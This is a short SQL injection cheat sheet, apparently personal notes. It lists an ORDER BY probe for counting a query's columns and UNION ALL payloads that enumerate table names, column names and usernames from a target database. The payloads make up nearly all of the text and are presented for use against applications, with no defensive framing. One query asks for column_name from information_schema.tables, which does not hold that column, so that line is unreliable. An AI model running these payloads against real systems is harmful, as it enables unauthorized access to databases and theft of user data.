Column enumeration

`1 ORDER BY X` where X is the column number 

Enumeration through query

`1 union all <query>`

Note that the query will need to result in the same number of columns to avoid errors.

`<query>` could be:
- `select 1, table_name from information_schema.tables` (this is MariaDB specific)
- `select 1, column_name from information_schema.tables where table_name='users'`
- `select 1, username from users`
